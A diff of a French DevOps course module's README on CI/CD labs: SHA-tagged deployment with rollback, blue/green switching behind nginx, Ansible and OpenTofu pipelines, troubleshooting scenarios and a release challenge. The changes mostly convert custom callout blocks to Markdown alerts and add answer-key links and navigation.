+> Critère de succès : un run `ci` vert sur `main` avec les jobs `lint` et
+> `test`, un artefact `rapport-tests` téléchargeable, `main` protégée, runner
+> `Idle` avec `capacity: 2`.
+>
+> ```bash
+> bash check_M25_01.sh
+> ```
 
 ---
 
-### **L25.2** — Pipeline complet : de la PR au rollback automatique
+### <a id="l25-2"></a>**[L25.2](corrige.md#l25-2)** — Pipeline complet : de la PR au rollback automatique
 
-::: contexte
-Ticket : « Le déploiement de factura se fait par `scp` depuis le poste de
-Julien. Julien est en congé trois semaines. » On veut un déploiement
-reproductible depuis le pipeline : image taguée par SHA, scannée, poussée
-sur le registre de `lab-ops`, déployée sur `lab-web` par SSH avec une clé
-qui ne peut rien faire d'autre, smoke test, et retour arrière automatique.
-:::
+> **Contexte**
+>
+> Ticket : « Le déploiement de factura se fait par `scp` depuis le poste de
+> Julien. Julien est en congé trois semaines. » On veut un déploiement
+> reproductible depuis le pipeline : image taguée par SHA, scannée, poussée
+> sur le registre de `lab-ops`, déployée sur `lab-web` par SSH avec une clé
+> qui ne peut rien faire d'autre, smoke test, et retour arrière automatique.
 
 Sur `lab-web` :
 
@@ -850,33 +863,35 @@ Sur `lab-ops`, dans `factura` :
    `environment`). Ajoute un `Jenkinsfile` déclaratif de 10 lignes qui
    fait lint → test → build. Valide les trois YAML avec `yamllint`.
 
-::: astuce
-Pour lire un secret multi-ligne (clé privée) dans un step, passe-le par
-`env:` et écris-le avec `printf '%s\n' "$KEY"`. Un `echo` non quoté
-recolle les lignes et la clé devient invalide.
-:::
+> [!TIP]
+> **Astuce**
+>
+> Pour lire un secret multi-ligne (clé privée) dans un step, passe-le par
+> `env:` et écris-le avec `printf '%s\n' "$KEY"`. Un `echo` non quoté
+> recolle les lignes et la clé devient invalide.
 
-::: check
-Critère de succès : `curl http://10.10.10.11:8080/version` renvoie le SHA
-court du dernier commit sain de `main`, le registre expose ce tag, un run a
-exécuté le step `rollback` avec succès, et `deploy@lab-web` refuse toute
-commande hors `deploy|rollback|status`.
-
-```bash
-bash check_M25_02.sh
-```
-:::
+> [!TIP]
+> **Critère de succès**
+>
+> Critère de succès : `curl http://10.10.10.11:8080/version` renvoie le SHA
+> court du dernier commit sain de `main`, le registre expose ce tag, un run a
+> exécuté le step `rollback` avec succès, et `deploy@lab-web` refuse toute
+> commande hors `deploy|rollback|status`.
+>
+> ```bash
+> bash check_M25_02.sh
+> ```
 
 ---
 
-### **L25.3** — Blue/green derrière nginx, bascule depuis le pipeline
+### <a id="l25-3"></a>**[L25.3](corrige.md#l25-3)** — Blue/green derrière nginx, bascule depuis le pipeline
 
-::: contexte
-Le rollback de L25.2 coupe le service pendant `docker compose up` (5 à
-15 s). Le métier veut zéro coupure et un retour arrière instantané. On passe
-en blue/green : deux instances, nginx en frontal, la bascule est un symlink
-et un `reload`.
-:::
+> **Contexte**
+>
+> Le rollback de L25.2 coupe le service pendant `docker compose up` (5 à
+> 15 s). Le métier veut zéro coupure et un retour arrière instantané. On passe
+> en blue/green : deux instances, nginx en frontal, la bascule est un symlink
+> et un `reload`.
 
 Sur `lab-web` :
 
@@ -918,27 +933,28 @@ Sur `lab-ops` :
    blue/green ne résout **pas** (migrations de schéma, sessions, coût), et
    comment tu ferais un canari à 10 % avec nginx (`weight`, ou `split_clients`).
 
-::: check
-Critère de succès : `curl -sI http://10.10.10.11/ | grep X-Factura-Color`
-donne la couleur active, les deux conteneurs tournent avec deux tags
-différents, la boucle de curl ne voit que des 200 pendant un `switch`, et
-le run du pipeline montre `stage → smoke → switch → smoke`.
-
-```bash
-bash check_M25_03.sh
-```
-:::
+> [!TIP]
+> **Critère de succès**
+>
+> Critère de succès : `curl -sI http://10.10.10.11/ | grep X-Factura-Color`
+> donne la couleur active, les deux conteneurs tournent avec deux tags
+> différents, la boucle de curl ne voit que des 200 pendant un `switch`, et
+> le run du pipeline montre `stage → smoke → switch → smoke`.
+>
+> ```bash
+> bash check_M25_03.sh
+> ```
 
 ---
 
-### **L25.4** — Pipeline d'infrastructure : Ansible et OpenTofu
+### <a id="l25-4"></a>**[L25.4](corrige.md#l25-4)** — Pipeline d'infrastructure : Ansible et OpenTofu
 
-::: contexte
-La configuration nginx de L25.3 a été faite à la main. L'audit demande que
-toute modification d'infra passe par une PR, avec un `--check --diff`
-lisible par le relecteur, et que l'application ne se fasse qu'après merge.
-Pour OpenTofu, `plan` en PR, `apply` uniquement sur décision explicite.
-:::
+> **Contexte**
+>
+> La configuration nginx de L25.3 a été faite à la main. L'audit demande que
+> toute modification d'infra passe par une PR, avec un `--check --diff`
+> lisible par le relecteur, et que l'application ne se fasse qu'après merge.
+> Pour OpenTofu, `plan` en PR, `apply` uniquement sur décision explicite.
 
 Dans `~/lab25/factura-infra` (dépôt Gitea `factura-infra`) :
 
@@ -974,35 +990,38 @@ Dans `~/lab25/factura-infra` (dépôt Gitea `factura-infra`) :
 6. Protège `main` de `factura-infra` : revue obligatoire, status checks
    `ansible / lint` `(*)` et `tofu / plan` `(*)` requis (motifs glob : le nom réel du statut se termine par `(push)` ou `(pull_request)`).
 
-::: attention
-`ansible-playbook --check` sur un playbook qui contient un `command` sans
-`check_mode: false`/`changed_when` s'arrête ou ment. Lis les tâches du
-playbook livré : l'une d'elles est volontairement ambiguë.
-:::
+> [!CAUTION]
+> **Attention**
+>
+> `ansible-playbook --check` sur un playbook qui contient un `command` sans
+> `check_mode: false`/`changed_when` s'arrête ou ment. Lis les tâches du
+> playbook livré : l'une d'elles est volontairement ambiguë.
 
-::: check
-Critère de succès : un run `ansible` avec `check` vert sur la PR et `apply`
-vert sur `main` ; un run `tofu` avec artefact `plan` ; le job `apply` de
-`tofu` refuse `confirm: non` ; `main` de `factura-infra` protégée.
-
-```bash
-bash check_M25_04.sh
-```
-:::
+> [!TIP]
+> **Critère de succès**
+>
+> Critère de succès : un run `ansible` avec `check` vert sur la PR et `apply`
+> vert sur `main` ; un run `tofu` avec artefact `plan` ; le job `apply` de
+> `tofu` refuse `confirm: non` ; `main` de `factura-infra` protégée.
+>
+> ```bash
+> bash check_M25_04.sh
+> ```
 
 ---
 
 ## 25.7 Break & Fix ★★★
 
-::: attention
-Avant chaque Break & Fix : `qm snapshot 9005 avant-bf25`. Les scripts de
-panne agissent sur `~/lab25/factura` (commit + push sur `main` au nom d'un
-« collègue ») et parfois sur le registre. Snapshot de secours `snap-clean`,
-mais l'utiliser vaut échec : le diagnostic se fait dans l'interface de
-Gitea, dans les journaux du runner et sur `lab-web`.
-:::
+> [!CAUTION]
+> **Attention**
+>
+> Avant chaque Break & Fix : `qm snapshot 9005 avant-bf25`. Les scripts de
+> panne agissent sur `~/lab25/factura` (commit + push sur `main` au nom d'un
+> « collègue ») et parfois sur le registre. Snapshot de secours `snap-clean`,
+> mais l'utiliser vaut échec : le diagnostic se fait dans l'interface de
+> Gitea, dans les journaux du runner et sur `lab-web`.
 
-### **BF25.1** — « Le pipeline a disparu »
+### <a id="bf25-1"></a>**[BF25.1](corrige.md#bf25-1)** — « Le pipeline a disparu »
 
 ```bash
 sudo bash break_M25_01.sh
@@ -1021,11 +1040,9 @@ fait, mais pas dans l'onglet où on regarde), identifier la ou les lignes
 fautives, corriger, et proposer la vérification locale qui aurait bloqué le
 commit (hook `pre-commit` ou job dédié).
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
-### **BF25.2** — « Ça tourne depuis 40 minutes »
+### <a id="bf25-2"></a>**[BF25.2](corrige.md#bf25-2)** — « Ça tourne depuis 40 minutes »
 
 ```bash
 sudo bash break_M25_02.sh
@@ -1044,11 +1061,9 @@ job à un runner, trouver la cause dans le diff du commit, et choisir entre
 deux correctifs valables (côté workflow ou côté runner) en argumentant.
 Bonus : montrer, dans les logs du runner, qu'il **ne voit même pas** le job.
 
-::: repondre
-lignes: 8
-:::
+<!-- repondre: 8 -->
 
-### **BF25.3** — « Le mot de passe du registre est dans les logs »
+### <a id="bf25-3"></a>**[BF25.3](corrige.md#bf25-3)** — « Le mot de passe du registre est dans les logs »
 
 ```bash
 sudo bash break_M25_03.sh
@@ -1068,11 +1083,9 @@ masquage n'a pas fonctionné sur celles-là, corriger le step, **faire
 tourner** le secret (nouvelle valeur côté registre et côté Gitea) et écrire
 les deux règles à ajouter à la revue de code.
 
-::: repondre
-lignes: 10
-:::
+<!-- repondre: 10 -->
 
-### **BF25.4** — « Le pipeline est vert, la prod est vieille »
+### <a id="bf25-4"></a>**[BF25.4](corrige.md#bf25-4)** — « Le pipeline est vert, la prod est vieille »
 
 ```bash
 sudo bash break_M25_04.sh          # sur lab-ops
@@ -1098,24 +1111,22 @@ combinés, rendent la panne invisible ; rétablir le déploiement par SHA et le
 smoke test qui aurait détecté le problème ; expliquer pourquoi le tag
 `latest` n'a plus sa place dans un déploiement.
 
-::: repondre
-lignes: 10
-:::
+<!-- repondre: 10 -->
 
 ---
 
 ## 25.8 Défi du module ★★★
 
-**D25 — Chaîne de release : de `v1.0.0` à la promotion en production**
+<a id="d25"></a>**[D25](corrige.md#d25) — Chaîne de release : de `v1.0.0` à la promotion en production**
 
-::: contexte
-Le pipeline de `factura` déploie tout ce qui arrive sur `main`. Le métier
-veut des **versions** : un tag Git SemVer déclenche une release, un
-changelog est généré, l'image est promue en « prod » sans rebuild, et une
-release Gitea garde la trace de ce qui a été livré. Le déploiement continu
-sur `main` reste pour la recette (la couleur inactive de L25.3) ; seule la
-promotion touche la couleur active.
-:::
+> **Contexte**
+>
+> Le pipeline de `factura` déploie tout ce qui arrive sur `main`. Le métier
+> veut des **versions** : un tag Git SemVer déclenche une release, un
+> changelog est généré, l'image est promue en « prod » sans rebuild, et une
+> release Gitea garde la trace de ce qui a été livré. Le déploiement continu
+> sur `main` reste pour la recette (la couleur inactive de L25.3) ; seule la
+> promotion touche la couleur active.
 
 Cahier des charges :
 
@@ -1153,11 +1164,12 @@ Cahier des charges :
 
 Temps visé : 60 à 90 minutes.
 
-::: check
-```bash
-bash check_M25_05.sh v1.0.0
-```
-:::
+> [!TIP]
+> **Critère de succès**
+>
+> ```bash
+> bash check_M25_05.sh v1.0.0
+> ```
 
 ---
 
@@ -1190,3 +1202,9 @@ Pour aller plus loin :
   image non signée : c'est la marche suivante après le scan.
 * Lis le rapport *State of DevOps* de l'année : les quatre métriques y sont
   définies avec leurs seuils, et une cinquième (fiabilité) y est discutée.
+
+<!-- nav:début -->
+---
+
+[← Module 24](../24-iac-terraform/README.md) · [Corrigé](corrige.md) · [Module 26 →](../26-kubernetes-observabilite/README.md) · [Parcours](../../docs/parcours.md) · [Accueil](../../README.md)
+<!-- nav:fin -->
